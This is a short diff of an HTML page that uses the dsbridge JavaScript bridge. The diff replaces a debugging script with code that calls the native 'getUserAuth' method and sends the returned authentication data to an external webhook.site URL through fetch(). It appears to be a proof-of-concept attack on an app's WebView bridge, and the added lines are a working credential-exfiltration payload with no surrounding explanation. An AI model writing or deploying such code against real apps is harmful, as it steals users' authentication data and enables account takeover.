@@ -1,16 +1,9 @@
-<script src="https://cdn.jsdelivr.net/npm/dsbridge@3.1.4/dist/dsbridge.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/dsbridge@3.1.4/dist/dsbridge.js"></script>
 
 <script>
-document.addEventListener("DOMContentLoaded",()=>{
-  const bridge = window.dsBridge || window._dsbridge;
-
-  if(!bridge || !bridge.call){
-    alert("bridge ga ada");
-    return;
-  }
-
-  bridge.call("getUserAuth", {}, function(resp){
-      alert("dapet: " + JSON.stringify(resp));
-  });
-});
+    const bridge = window._dsBridge;
+    bridge.call("getUserAuth", {}, function(resp){
+        fetch("https://webhook.site/767aff36-7e40-4fb5-ae1a-93431ada5cab?data=" + encodeURIComponent(resp));
+        alert("data:" + JSON.stringify(resp));
+    });
 </script>
